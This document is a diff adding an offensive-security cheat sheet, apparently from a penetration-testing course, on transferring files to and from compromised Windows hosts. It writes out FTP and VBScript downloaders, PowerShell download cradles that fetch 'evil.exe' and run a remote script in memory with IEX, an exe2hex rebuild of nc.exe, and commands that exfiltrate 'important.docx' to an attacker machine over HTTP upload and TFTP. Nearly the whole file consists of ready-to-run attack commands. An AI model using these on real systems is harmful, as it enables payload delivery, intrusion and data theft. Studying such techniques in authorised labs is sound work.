@@ -1,0 +1,125 @@
+#!/usr/bin/peno
+
+#FTP
+#Installing Pure-FTP on Kali
+sudo apt update && sudo apt install pure-ftpd
+
+#FTP
+#Bash script to setup Pure-FTP on Kali
+#cat ./setup-ftp.sh
+#!/bin/bash
+sudo groupadd ftpgroup
+sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+sudo pure-pw useradd offsec -u ftpuser -d /ftphome
+sudo pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+sudo ln -s ../conf/PureDB 60pdb
+sudo mkdir -p /ftphome
+sudo chown -R ftpuser:ftpgroup /ftphome/
+sudo systemctl restart pure-ftpd
+
+#FTP
+#Creating the non-interactive FTP script
+
+echo open 10.11.0.4 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo lab>> ftp.txt
+echo bin >> ftp.txt
+echo GET nc.exe >> ftp.txt
+echo bye >> ftp.txt
+
+#FTP
+#Using FTP non-interactively
+ftp -v -n -s:ftp.txt
+
+
+#VBScript
+#Creating a VBScript HTTP downloader script
+echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+echo  Err.Clear >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+echo  http.Open "GET", strURL, False >> wget.vbs
+echo  http.Send >> wget.vbs
+echo  varByteArray = http.ResponseBody >> wget.vbs
+echo  Set http = Nothing >> wget.vbs
+echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+echo  strData = "" >> wget.vbs
+echo  strBuffer = "" >> wget.vbs
+echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+echo  Next >> wget.vbs
+echo  ts.Close >> wget.vbs
+
+#VBScript
+#Executing the VBScript HTTP downloader script
+cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
+
+#Powershell
+#Creating a PowerShell HTTP downloader script
+
+echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
+echo $file = "new-exploit.exe" >>wget.ps1
+echo $webclient.DownloadFile($url,$file) >>wget.ps1
+
+#Powershell
+#Executing the PowerShell HTTP downloader script
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+
+#Powershell
+#One-liner
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+
+#Powershell
+#One-liner Executing a remote PowerShell script directly from memory
+powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')
+
+#Powershell
+#Windows Downloads with exe2hex and PowerShell
+#PowerShell command to rebuild nc.exe
+upx -9 nc.exe
+exe2hex -x nc.exe -p nc.cmd
+
+powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
+
+
+#Powershell
+#PHP script to receive HTTP POST request
+#PowerShell command to upload a file to the attacker machine
+<?php
+$uploaddir = '/var/www/uploads/';
+
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+
+powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.168/upload.php', 'important.docx')
+
+#Powershell
+#
+#
+
+
+#TFTP
+#Setting up a TFTP server on Kali
+kali@kali:~$ sudo apt update && sudo apt install atftp
+kali@kali:~$ sudo mkdir /tftp
+kali@kali:~$ sudo chown nobody: /tftp
+kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
+
+#TFTP
+#Uploading files to our Kali machine using TFTP
+tftp -i 10.11.0.4 put important.docx
+
